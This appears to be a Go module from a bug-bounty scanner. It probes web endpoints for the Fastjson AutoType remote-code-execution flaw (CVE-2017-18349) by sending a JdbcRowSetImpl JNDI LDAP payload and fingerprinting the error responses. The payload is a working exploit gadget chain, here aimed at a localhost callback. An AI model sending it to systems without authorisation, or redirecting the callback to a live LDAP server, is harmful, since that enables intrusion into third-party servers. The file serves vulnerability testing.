package bugbounty

import (
	"fmt"
	"io"
	"net/http"
	"strings"
)

// ============================================================
// Fastjson 1.2.24 / 1.2.45 AutoType RCE
// Uses JdbcRowSetImpl + JNDI LDAP callback
// ============================================================
func ProbeFastjson(base string) *Finding {
	// Step 1: echo endpoint check
	req, _ := http.NewRequest("POST", base+"/", strings.NewReader(`{"name":"test","age":1}`))
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	resp.Body.Close()
	if !strings.Contains(string(body), "name") {
		return nil
	}

	// Step 2: Class cache bypass payload
	payload := `{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/test","autoCommit":true}}`
	req2, _ := http.NewRequest("POST", base+"/", strings.NewReader(payload))
	req2.Header.Set("Content-Type", "application/json")
	resp2, err := client.Do(req2)
	if err != nil {
		return nil
	}
	body2, _ := io.ReadAll(io.LimitReader(resp2.Body, 4096))
	resp2.Body.Close()
	s := string(body2)

	// 1.2.24: message:"-1" (500)
	// 1.2.45: "set property error, autoCommit" (400)
	// Both mean JdbcRowSetImpl was loaded → AutoType bypassed
	if strings.Contains(s, "-1") || strings.Contains(s, "set property error") ||
		strings.Contains(s, "JdbcRowSetImpl") || strings.Contains(s, "autoCommit") {
		ver := "1.2.24"
		if strings.Contains(s, "set property error") {
			ver = "1.2.45"
		}
		return &Finding{Target: base, Vuln: fmt.Sprintf("CVE-2017-18349 Fastjson %s RCE", ver), Severity: "CRITICAL",
			Detail: fmt.Sprintf("AutoType bypass confirmed, JdbcRowSetImpl loaded (HTTP %d)", resp2.StatusCode), URL: base}
	}
	return &Finding{Target: base, Vuln: "Fastjson Endpoint Detected", Severity: "MEDIUM",
		Detail: "echo endpoint found, AutoType unknown", URL: base}
}
